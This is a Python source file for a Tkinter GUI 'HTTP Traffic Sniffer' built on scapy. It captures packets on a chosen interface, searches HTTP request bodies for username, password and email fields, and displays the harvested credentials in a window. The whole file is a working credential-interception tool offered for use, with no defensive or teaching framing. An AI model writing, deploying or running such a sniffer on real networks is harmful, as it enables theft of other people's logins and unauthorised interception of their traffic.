import tkinter as tk
from tkinter import scrolledtext
from threading import Thread
import scapy.all as scapy
from scapy.layers import http
from urllib.parse import parse_qs
import argparse

def start_sniffing(text_box):
    iface = get_interface()
    Thread(target=sniff_and_process, args=(iface, text_box), daemon=True).start()

def get_interface():
    parser = argparse.ArgumentParser(description="HTTP Traffic Sniffer")
    parser.add_argument("-i", "--interface", dest="interface", help="Specify the interface.")
    arguments = parser.parse_args()
    return arguments.interface

def process_packet(packet, text_box):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host.decode('utf-8') + packet[http.HTTPRequest].Path.decode('utf-8')

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = [b"username", b"password", b"pass", b"email"]

            for key in keys:
                if key in load:
                    decoded_data = parse_qs(load.decode('utf-8'))
                    result = f"\nUsername: {decoded_data['username'][0]}, Password: {decoded_data['password'][0]}\n"
                    update_text(text_box, result)
                    break

def sniff_and_process(iface, text_box):
    scapy.sniff(iface=iface, store=False, prn=lambda packet: process_packet(packet, text_box))

def update_text(text_box, text):
    text_box.insert(tk.END, text)
    text_box.yview(tk.END)

# Example usage:
if __name__ == "__main__":
    root = tk.Tk()
    root.title("HTTP Traffic Sniffer")

    text_box = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=80, height=20)
    text_box.pack(padx=10, pady=10)

    start_button = tk.Button(root, text="Start Sniffing", command=lambda: start_sniffing(text_box))
    start_button.pack(pady=10)

    root.mainloop()
